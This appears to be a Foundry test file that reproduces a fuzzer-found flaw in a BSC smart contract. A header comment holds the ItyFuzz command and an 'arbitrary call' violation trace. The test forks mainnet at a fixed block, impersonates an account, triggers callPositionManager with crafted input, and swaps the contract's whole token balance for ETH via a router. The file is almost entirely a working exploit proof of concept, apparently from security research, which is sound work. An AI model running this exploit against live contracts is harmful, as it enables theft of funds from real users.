// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x55d398326f99059fF775485246999027B3197955,0x7BA5dd9Bb357aFa2231446198c75baC17CEfCda9,0x13f4EA83D0bd40E75C8222255bc855a974568Dd4,0x5542958FA9bD89C96cB86D1A6Cb7a3e644a3d46e,0x98e241bd3be918e0d927af81b430be00d86b04f9,0x7ba5dd9bb357afa2231446198c75bac17cefcda9 -c bsc --onchain-block-number 29214010 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Arbitrary call from "0x13f4ea83d0bd40e75c8222255bc855a974568dd4" to 0x46a15b0b27311cedf172ab29e4f4766fbe7f4364
================ Trace ================
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   ├─[1] 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4.callPositionManager(0xb1002f40f09edee663b2aaaaaaaaaafb8100ff8d)
   ├─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4 → WETH), address(this), block.timestamp);
   │  │  └─ ← ()


 */

contract C55d3 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 29214010);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        
        0x13f4EA83D0bd40E75C8222255bc855a974568Dd4.call(abi.encodeWithSignature(
            "callPositionManager(bytes)",0xb1002f40f09edee663b2aaaaaaaaaafb8100ff8d
        )); 
        vm.startPrank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        uint256 amount0 = IERC20(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4).balanceOf(address(this));
        IERC20(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4;
        liq_path0[1] = address(weth);
        vm.deal(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
    }

    // Stepping with return
    receive() external payable {}
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
